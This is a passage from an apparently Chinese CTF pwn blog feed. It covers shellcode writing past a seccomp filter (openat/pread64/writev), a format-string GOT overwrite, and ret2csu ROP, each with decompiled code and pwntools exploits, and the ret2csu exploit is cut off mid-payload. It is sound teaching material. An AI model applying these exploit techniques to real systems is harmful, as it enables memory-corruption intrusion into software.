class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(EVP_PKEY_CTX *param_1)</span><br>&#123;<br>  <span class="hljs-type">int</span> iVar1;<br>  <span class="hljs-type">char</span> *__s;<br>  <span class="hljs-type">size_t</span> sVar2;<br>  <span class="hljs-type">size_t</span> __n;<br>  <span class="hljs-type">long</span> lVar3;<br>  undefined8 *puVar4;<br>  <span class="hljs-type">long</span> in_FS_OFFSET;<br>  byte bVar5;<br>  undefined8 local_218;<br>  undefined8 local_210;<br>  undefined8 local_208 [<span class="hljs-number">63</span>];<br>  undefined8 local_10;<br>  <br>  bVar5 = <span class="hljs-number">0</span>;<br>  local_10 = *(undefined8 *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>); <span class="hljs-meta"># canary</span><br>  init(param_1);   #初始化函数<br>  local_218 = <span class="hljs-number">0</span>;<br>  local_210 = <span class="hljs-number">0</span>;<br>  puVar4 = local_208;<br>  <span class="hljs-keyword">for</span> (lVar3 = <span class="hljs-number">0x3e</span>; lVar3 != <span class="hljs-number">0</span>; lVar3 = lVar3 + <span class="hljs-number">-1</span>) &#123;<br>    *puVar4 = <span class="hljs-number">0</span>;<br>    puVar4 = puVar4 + (ulong)bVar5 * <span class="hljs-number">-2</span> + <span class="hljs-number">1</span>;<br>  &#125;<br>  *(undefined1 *)puVar4 = <span class="hljs-number">0</span>;<br>  __s = (<span class="hljs-type">char</span> *)read_flag(<span class="hljs-string">&quot;/flag&quot;</span>);  #关键<br>  sVar2 = <span class="hljs-built_in">strlen</span>(__s);<br>  __s[sVar2] = <span class="hljs-string">&#x27;H&#x27;</span>;<br>  __s[sVar2 + <span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;1&#x27;</span>;<br>  __s[sVar2 + <span class="hljs-number">2</span>] = <span class="hljs-number">-0x40</span>;   <span class="hljs-meta">#xor rax,rax</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;I forgot the flag.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Can you find it?&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; &gt; &quot;</span>);<br>  __n = read(<span class="hljs-number">0</span>,&amp;local_218,<span class="hljs-number">0x200</span>);<br>  <span class="hljs-keyword">if</span> (__n == <span class="hljs-number">0</span>) &#123;<br>    perror(<span class="hljs-string">&quot;read&quot;</span>);<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-built_in">memcpy</span>(__s + sVar2 + <span class="hljs-number">3</span>,&amp;local_218,__n);<br>  iVar1 = mprotect(__s,<span class="hljs-number">0x1000</span>,<span class="hljs-number">5</span>);   #可执行<br>  <span class="hljs-keyword">if</span> (iVar1 == <span class="hljs-number">-1</span>) &#123;<br>    perror(<span class="hljs-string">&quot;mprotect&quot;</span>);<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  install_seccomp();<br>                    <span class="hljs-comment">/* WARNING: Could not recover jumptable at 0x0010169d. Too many branches */</span><br>                    <span class="hljs-comment">/* WARNING: Treating indirect jump as call */</span><br>  (*(code *)(__s + sVar2))(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);  #执行<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>read_flag函数为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> * <span class="hljs-title function_">read_flag</span><span class="hljs-params">(<span class="hljs-type">char</span> *param_1)</span><br>&#123;<br>  <span class="hljs-type">int</span> __fd;<br>  <span class="hljs-type">void</span> *pvVar1;<br>  <br>  __fd = open(param_1,<span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> (__fd &lt; <span class="hljs-number">0</span>) &#123;<br>    perror(<span class="hljs-string">&quot;Can\&#x27;t open flag file: &quot;</span>);<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  pvVar1 = mmap((<span class="hljs-type">void</span> *)<span class="hljs-number">0x0</span>,<span class="hljs-number">0x1000</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,__fd,<span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> (pvVar1 == (<span class="hljs-type">void</span> *)<span class="hljs-number">0xffffffffffffffff</span>) &#123;<br>    perror(<span class="hljs-string">&quot;mmap&quot;</span>);<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  close(__fd);<br>  <span class="hljs-keyword">return</span> pvVar1;<br>&#125;<br></code></pre></td></tr></table></figure><p>题目逻辑非常清晰，也很贴心，程序先把flag文件的内容直接读到内存里，然后在flag结尾拼接你输入的数据(我们写的shellcode)，再把这整块内存改成RX(可执行)，最后从flag末尾开始当函数执行你的shellcode，所以解法也是很简单，直接在mmap空间搜索<code>flag{}</code>字符串即可</p><p>这里涉及到如何编写汇编</p><p>我先直接放一下我写的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br><br>io = remote(<span class="hljs-string">&#x27;host&#x27;</span>,port)<br><br>shellcode = asm(<span class="hljs-string">r&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    lea rbx, [rip]  #加载地址</span><br><span class="hljs-string"></span><br><span class="hljs-string">find_flag:</span><br><span class="hljs-string">    dec rbx          # rbx=rbx-1 循环</span><br><span class="hljs-string">    cmp dword ptr [rbx], 0x67616c66   # flag字符串</span><br><span class="hljs-string">    jne find_flag    #条件跳转,不是flag继续往前找,注意byte dword qword区别 </span><br><span class="hljs-string">    cmp byte ptr [rbx+4], 0x7b        #&#123; 二次验证</span><br><span class="hljs-string">    jne find_flag</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rsi, rbx      #到这里已经找到了，先将rsi设置为flag的起始地址</span><br><span class="hljs-string">    xor rdx, rdx      #len先设置为0，读取flag直到&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">len_scan:</span><br><span class="hljs-string">    cmp byte ptr [rsi + rdx], 0x7d   #&#125;</span><br><span class="hljs-string">    je write_flag</span><br><span class="hljs-string">    inc rdx             #rdx=rdx+1</span><br><span class="hljs-string">    jmp len_scan</span><br><span class="hljs-string"></span><br><span class="hljs-string">write_flag:</span><br><span class="hljs-string">    inc rdx          #加上&#125;</span><br><span class="hljs-string">    mov rdi, 1        #stdout</span><br><span class="hljs-string">    mov rax, 1         #write系统调用号</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rax, 60       #exit</span><br><span class="hljs-string">    xor rdi, rdi      #rdi=0</span><br><span class="hljs-string">    syscall         #安全退出程序</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br>io.recvuntil(<span class="hljs-string">b&#x27;&gt; &#x27;</span>)<br>io.send(shellcode)<br>io.interactive()<br></code></pre></td></tr></table></figure><p>直接看注释吧，应该蛮好理解的…</p><p>接下来看第三题</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">undefined8 <span class="hljs-title function_">main</span><span class="hljs-params">(EVP_PKEY_CTX *param_1)</span><br>&#123;<br>  code *__buf;<br>  <br>  init(param_1);<br>  __buf = (code *)mmap((<span class="hljs-type">void</span> *)<span class="hljs-number">0x114514</span>,<span class="hljs-number">0x1000</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0x22</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;please input a orw_plus function (also also after compile)&quot;</span>);<br>  read(<span class="hljs-number">0</span>,__buf,<span class="hljs-number">0x500</span>);<br>  install_seccomp();<br>  (*__buf)();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>题目逻辑和第一题一模一样，不同之处在于开启了seccomp，发现其禁用了execve,open,read,write,sendfile,没招了吗,不,其实还有很多的类似功能的<code>orw</code>供聪明的我们使用，这里我用的是<code>openat</code>,<code>pread64</code>和<code>writev</code></p><p>直接看exp吧…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p = remote(<span class="hljs-string">&#x27;host&#x27;</span>,port)<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rdi, -100     # openat(-100,flag,0,0)  系统调用号 257   在栈上动态构造shellcode  寄存器rdi rsi rdx r10 r8 r9 ...</span><br><span class="hljs-string">    push 0x67616c66   # flag </span><br><span class="hljs-string">    mov rsi, rsp</span><br><span class="hljs-string">    xor rdx, rdx</span><br><span class="hljs-string">    xor r10, r10</span><br><span class="hljs-string">    push 257</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    push rax    # pread64(fd,buf,0x100,0)  系统调用号 17  将rax传给rdi作为fd</span><br><span class="hljs-string">    pop rdi</span><br><span class="hljs-string">    sub rsp, 0x100   #分配足够的栈空间来读取flag</span><br><span class="hljs-string">    push rsp</span><br><span class="hljs-string">    pop rsi</span><br><span class="hljs-string">    push 0x100</span><br><span class="hljs-string">    pop rdx</span><br><span class="hljs-string">    xor r10, r10</span><br><span class="hljs-string">    push 17</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    push 1    # writev(1,struct iovec,1)  系统调用号 20  struct iovec len + base*</span><br><span class="hljs-string">    pop rdi</span><br><span class="hljs-string">    mov rsi, rsp</span><br><span class="hljs-string">    push 0x100</span><br><span class="hljs-string">    push rsi</span><br><span class="hljs-string">    mov rsi, rsp</span><br><span class="hljs-string">    push 1</span><br><span class="hljs-string">    pop rdx</span><br><span class="hljs-string">    push 20</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    nop</span><br><span class="hljs-string">    nop</span><br><span class="hljs-string">    nop</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;)&#x27;</span>)<br><br>p.send(shellcode)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>这里解释一下iovec结构体(分散-聚集I&#x2F;O)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/uio.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> &#123;</span><br>    <span class="hljs-type">void</span>  *iov_base;  <span class="hljs-comment">// 缓冲区起始地址（用户空间内存）</span><br>    <span class="hljs-type">size_t</span> iov_len;   <span class="hljs-comment">// 缓冲区长度（字节数）</span><br>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asm">mov rsi, rsp<br>push 0x100<br>push rsi<br>mov rsi, rsp<br></code></pre></td></tr></table></figure><p>这里把rsp保存至rsi，先<code>push 0x100</code>(len)至栈上，再<code>push rsi</code>(flag起始地址)至栈上，这便形成了一个<code>struct iovec</code>，再把rsp(iov_base指针)传给rdi即可</p><p>同时,总结一下栈结构</p><p>高地址</p><p>argc<br>argv[]<br>envp[]<br>auxv[]<br>…<br>返回地址<br>saved rbp<br>canary   maybe<br>局部变量<br>…   rsp<br>低地址</p><p>LIFO,push压栈<code>rsp -= 8</code>,pop出栈<code>rsp += 8</code>…</p><p>感谢阅读…</p><p>后面再补充吧…</p><p>2026.2.11吐槽:</p><p>被lactf的shellcode打败了…</p><p>不过</p><p>慢慢来吧…</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄存器</tag>
      
      <tag>shellcode编写</tag>
      
      <tag>汇编语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fmt_got</title>
    <link href="/2025/12/30/fmt-got/"/>
    <url>/2025/12/30/fmt-got/</url>
    
    <content type="html"><![CDATA[<p>你好，又见面了…</p><p>也有可能是第一次见面?</p><p>算了今天不废话了，直接看题目吧</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-type">long</span> in_FS_OFFSET;<br>  <span class="hljs-type">char</span> local_118 [<span class="hljs-number">264</span>];<br>  undefined8 local_10;<br>  <br>  local_10 = *(undefined8 *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);<br>  setup();<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;tell me what you want to say:&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&gt; &quot;</span>);<br>  builtin_strncpy(local_118,<span class="hljs-string">&quot;That\&#x27;s what you want to say...    &quot;</span>,<span class="hljs-number">0x23</span>);<br>  read(<span class="hljs-number">0</span>,local_118 + <span class="hljs-number">0x22</span>,<span class="hljs-number">0x100</span>);<br>  <span class="hljs-built_in">printf</span>(local_118);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nthat\&#x27;s it? boring... bye&quot;</span>);<br>  FUN_00401140(<span class="hljs-number">1</span>);<br>  halt_baddata();<br>&#125;<br></code></pre></td></tr></table></figure><p>还悄悄藏了一个函数…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">read_flag</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br><br>&#123;<br>  FILE *__stream;<br>  <span class="hljs-type">long</span> in_FS_OFFSET;<br>  <span class="hljs-type">char</span> local_58 [<span class="hljs-number">72</span>];<br>  <span class="hljs-type">long</span> local_10;<br>  <br>  local_10 = *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);<br>  __stream = fopen(<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<br>  <span class="hljs-keyword">if</span> (__stream == (FILE *)<span class="hljs-number">0x0</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;flag not found! Contact admin if you see this on the remote server.&quot;</span>);<br>    FUN_00401140(<span class="hljs-number">1</span>);<br>  &#125;<br>  fgets(local_58,<span class="hljs-number">0x40</span>,__stream);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;How you do that... here is the flag:  %s\n&quot;</span>,local_58);<br>  fclose(__stream);<br>  <span class="hljs-keyword">if</span> (local_10 != *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) &#123;<br>    __stack_chk_fail();<br>  &#125;<br>  <span class="hljs-keyword">return</span>;   <span class="hljs-meta">#ps:反正就是cat flag，写那么长我真没招了</span><br>&#125;<br></code></pre></td></tr></table></figure><p>保护为<code>NX</code>和<code>canary found</code>，但是不好意思，今天不打返回地址，注意到题目存在格式化字符串漏洞，同时保护为<code>partial RELRO</code>，因此<code>GOT</code>表可写，直接利用%n任意写覆盖exit的<code>GOT</code>表地址为<code>read_flag</code>即可</p><p>在此之前，你可能需要一些前置知识</p><p>1.什么是格式化字符串漏洞，本人词不达意，还请参考如下链接(直接点，放心)</p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">fmt</a></p><p>(2026.2.11复盘时吐槽:你不是词不达意，你是懒得写…)</p><p>2.什么是got表，什么是plt，动态链接器(ld,哈哈哈)和共享库是什么，程序第一次调用<code>puts</code>这个函数时到底发生了什么，想必经过ret2libc的洗礼，前两个问题的答案你已知晓，但是后两个问题将回到更底层的维度，等待着你去探索(我也在探索中…)，也许我后面会写一篇关于此和ret2dlresolve的文章，等我先沉淀沉淀吧…</p><p>OK，还是回到题目本身</p><p>先观察我们格式化字符的写入点</p><p><img src="/images/6.png" alt="qwq"></p><p>可以看到，我们的<code>AAAA</code>从第十个<code>%p</code>的第低三位个字节开始写起，我们的目标是将exit的got(0x403430)覆写为read_flag(0x401236)，采用<code>%hhn</code>逐字节写的方式</p><p>先将0x403430的最低字节0x30覆写为0x36(注意小端序地址表示法)，注意<code>builtin_strncpy(local_118,&quot;That\&#39;s what you want to say...    &quot;,0x23);</code>已经给了<code>local_118</code>34字节的长度，所以再补20个字节得到0x36(54)便可达到目的</p><p>然后将0x403431，即第低二位字节0x34覆写为0x12即可，注意此时<code>local_118</code>的长度已经是54，而目标是0x12(18)，因此先补202个字节至256(你懂的)，再补18个字节回到0x12，一共220个字节，便成功覆写了exit的<code>GOT</code>为<code>read_flag</code></p><p>先大致写出payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload  = <span class="hljs-string">b&#x27;%20x%?$hhn%220x%?$hhn&#x27;</span><br></code></pre></td></tr></table></figure><p>?即写入地址0x403430和0x403431的位置，我们推理一下，首先?必定为两位数，因此payload所占字节长度为<code>23</code>，而我们输入的字符从第十个<code>%p</code>的第低三位个字节开始写起，因此发送payload后先是6个字节写完了10，而后还有17个字节分别完了11，12，并写了13的1个字节，因此再补7个字节的长度填满13，最后输入要覆写的地址0x403430，0x403431即在14，15的位置，真是一场酣畅淋漓的构造啊…</p><p>当时的我只是傻傻地对着wp猜偏移，经过很长时间的分析(真的很长时间，没人问，纯自己瞎折腾 (╥﹏╥) )才终于理解了本质，现在写下来，希望能帮到困惑的你…</p><p>最后贴一下完整exp(真的很短，但是也真的很值得深思…)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>os = <span class="hljs-string">&quot;linux&quot;</span><br><span class="hljs-comment">#p = process(&#x27;./fmt_got&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">46677</span>)<br><br>payload  = <span class="hljs-string">b&#x27;%20x%14$hhn%220x%15$hhn&#x27;</span><br>payload += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">7</span><br>payload += p64(<span class="hljs-number">0x403430</span>) + p64(<span class="hljs-number">0x403431</span>)<br><br>p.sendafter(<span class="hljs-string">b&#x27;\n&gt; &#x27;</span>, payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>好了，又写一篇，感谢阅读，天天开心…</p><p>2026.2.12吐槽:</p><p>虽然写得挺唐</p><p>不过好在思路是正确的</p><p>不过我也没资格说你唐就是了</p><p>毕竟你就是我嘛…</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ret2GOT</tag>
      
      <tag>fmt</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ret2csu</title>
    <link href="/2025/12/25/ret2csu/"/>
    <url>/2025/12/25/ret2csu/</url>
    
    <content type="html"><![CDATA[<p>别急，还没写…</p><p>好了，现在写了…</p><p>额，还记得上次没有gadget的情况下我们采用了SROP，但是倘若没有syscall也没法控制rax呢，别急，还有一个办法，便是今天的<code>ret2csu</code></p><p>ps:现在看来当时好天真TT</p><p>一般的elf文件在<code>libc_start_main</code>中会存在<code>libc_csu_init</code>对libc进行初始化，而恰好<code>libc_csu_init</code>中隐含着两个我们可以利用的gadget…</p><p>一般长这样，<code>gadget1</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asm">00400606  mov rbx, [rsp+0x8]<br>0040060b  mov rbp, [rsp+0x10]<br>00400610  mov r12, [rsp+0x18]<br>00400615  mov r13, [rsp+0x20]<br>0040061a  mov r14, [rsp+0x28]<br>0040061f  mov r15, [rsp+0x30]<br>00400624  add rsp, 0x38<br>00400628  ret<br></code></pre></td></tr></table></figure><p>也有可能是一串<code>pop</code>，不过本质是一样的</p><p><code>gadget2</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asm">004005f0 mov     rdx, r15<br>004005f3 mov     rsi, r14<br>004005f6 mov     edi, r13d<br>004005f9 call    qword ptr [r12+rbx*8]<br></code></pre></td></tr></table></figure><p>乍一看，这啥呀，实则我们却能因此控制关键的<code>rdi</code>,<code>rsi</code>和<code>rdx</code>并调用函数，太神秘了…</p><p>好吧，还是来看具体的题目吧</p><p>题目依旧忘记出自哪里了，私密马赛</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br><br>&#123;<br>  write(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;Hello, World\n&quot;</span>,<span class="hljs-number">0xd</span>);<br>  vulnerable_function();<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">vulnerable_function</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  undefined1 local_88 [<span class="hljs-number">128</span>];<br>  <br>  read(<span class="hljs-number">0</span>,local_88,<span class="hljs-number">0x200</span>);<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>题目逻辑依旧十分简单，保护只有<code>NX</code>，非常轻松便能覆盖返回地址，缓冲区也量大管饱，而gadget便是我们的<code>libc_csu_init</code></p><p>第一步还是先泄露我们的libc基址</p><p>要注意的是:gadget1的地址就在gadget2后面，所以gadget1要执行两次(到ret才结束!)，不过第二次对我们rop链产生影响的只有<code>add rsp, 0x38</code>罢了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">payload1 = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x88</span>   <span class="hljs-comment">#填充</span><br>payload1 += p64(gadget1)<br>payload1 += p64(<span class="hljs-number">0</span>)     <span class="hljs-comment">#对齐rsp</span><br>payload1 += p64(<span class="hljs-number">0</span>)     <span class="hljs-comment">#rbx设置为0</span><br>payload1 += p64(<span class="hljs-number">1</span>)     <span class="hljs-comment">#注意:rbp必须设置为1，否则将进入循环，详情自己看汇编...</span><br>payload1 += p64(write_got) + p64(<span class="hljs-number">1</span>)   <span class="hljs-comment">#注意是call qword ptr [r12+rbx*8]，所以写write_got而不是write_plt</span><br>payload1 += p64(write_got) + p64(<span class="hljs-number">8</span>)<br>payload1 += p64(gadget2)   <br>payload1 += <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x38</span>  <span class="hljs-comment">#注意神秘的add rsp,0x38</span><br>payload1 += p64(main_addr)  <span class="hljs-comment">#回到main函数...</span><br><br>p.recvuntil(<span class="hljs-string">&quot;Hello, World\n&quot;</span>)<br><br>p.send(payload1)<br></code></pre></td></tr></table></figure><p>然后接收并计算关键地址…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">leak = p.recv(<span class="hljs-number">8</span>)<br>write_addr = u64(leak.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))<br><br>libc_base = write_addr - libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br>sys_addr = libc_base + 